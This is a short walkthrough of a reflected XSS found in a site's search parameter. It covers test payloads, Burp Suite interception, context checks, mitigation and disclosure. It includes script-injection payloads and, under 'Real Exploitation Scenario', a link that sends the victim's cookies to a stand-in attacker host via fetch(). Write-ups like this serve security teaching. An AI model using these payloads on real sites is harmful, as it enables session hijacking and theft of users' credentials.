# ⚡ Reflected XSS in Search Function (Full Practical Walkthrough)

## 🧾 Executive Summary

Identified a reflected XSS vulnerability in the search functionality due to lack of input sanitization.

---

## 🎯 Scope

* Web application testing
* Client-side injection testing
* Non-destructive payloads only

---

## 🔍 Step 1: Initial Recon

Visited target:

```
https://target.com
```

Identified search feature:

```
https://target.com/search?q=test
```

---

## 🧪 Step 2: Basic Testing

Injected payload:

```html
<script>alert(1)</script>
```

Observed reflection in response → suspicious

---

## 🚨 Step 3: Confirming Vulnerability

Used advanced payload:

```html
"><script>alert(document.domain)</script>
```

Result: Script executed successfully

---

## 🛠 Step 4: Using Burp Suite

* Intercepted request
* Modified parameter:

```
q=<script>alert(1)</script>
```

Forwarded → response executed script

---

## 🔬 Step 5: Context Analysis

Checked:

* HTML context ✔
* No encoding ❌
* No CSP ❌

---

## 🧠 Step 6: Real Exploitation Scenario

Malicious link:

```
https://target.com/search?q=<script>fetch('attacker.com?cookie='+document.cookie)</script>
```

Victim clicks → attacker gets session data

---

## 🛠 Tools Used

* Browser DevTools
* Burp Suite
* Kali Linux

---

## ⚠️ Impact

* Session hijacking
* Credential theft
* Phishing attacks

---

## 🛡️ Mitigation

* Escape user input
* Use output encoding
* Implement CSP
* Validate input server-side

---

## 📨 Responsible Disclosure

* Submitted detailed PoC
* Included request/response logs
* Provided mitigation steps

---

## ✅ Final Result

* Severity: Medium → High
* Confirmed exploitable

---

## 📌 Key Learning

Always sanitize and encode user input before rendering.
